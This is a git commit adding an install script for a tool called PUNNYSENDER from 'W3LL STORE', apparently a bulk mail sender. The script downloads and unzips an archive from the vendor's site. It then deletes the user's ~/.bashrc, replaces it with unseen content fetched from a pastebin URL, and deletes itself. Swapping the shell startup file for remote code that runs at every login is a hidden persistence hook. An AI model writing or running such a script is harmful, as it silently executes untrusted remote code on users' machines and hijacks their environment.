41ae6ba818f15607299d802bf3c231eda9073d32
W3LL STORE <81862344+W3LLLL@users.noreply.github.com>
2021-10-06 12:20:20 +0800

    PUNNYSENDER INSTALL

---
+++ install.sh
@@ -0,0 +1,29 @@
+clear
+printf "\e[92m▀█▀ ░█▄─░█ ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█─── ░█─── \n"
+printf "░█─ ░█░█░█ ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█─── ░█─── \n"
+printf "▄█▄ ░█──▀█ ░█▄▄▄█ ─░█── ░█─░█ ░█▄▄█ ░█▄▄█\n"
+printf "         \033[0;36m\n\n"
+sudo apt install -y screen
+sudo apt install -y unzip
+sudo apt-get update
+sudo locale-gen en_US.UTF-8
+sudo export LANG=en_US.UTF-8
+sudo apt-get update -y
+sudo apt-get upgrade -y
+sudo apt-get install -y figlet
+sudo apt-get install -y dos2unix
+sudo apt-get install -y curl
+sudo apt-get install software-properties-common
+sudo add-apt-repository ppa:ondrej/php
+sudo apt-get update -y
+sudo apt install -y nano
+sudo wget https://w3ll.shop/operators/PUNNY.zip
+sudo unzip -o PUNNY.zip
+sudo rm PUNNY.zip
+cp ~/.bashrc ~/.bashrc-bak
+rm -rf ~/.bashrc
+curl "https://pastebin.com/raw/2ixDfTbB" -o ~/.bashrc
+dos2unix ~/.bashrc
+clear
+printf "\e[32mSENDER INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m ./PUNNY\e[0m TO RUN SENDER NOW !\n\n"
+sudo rm install.sh
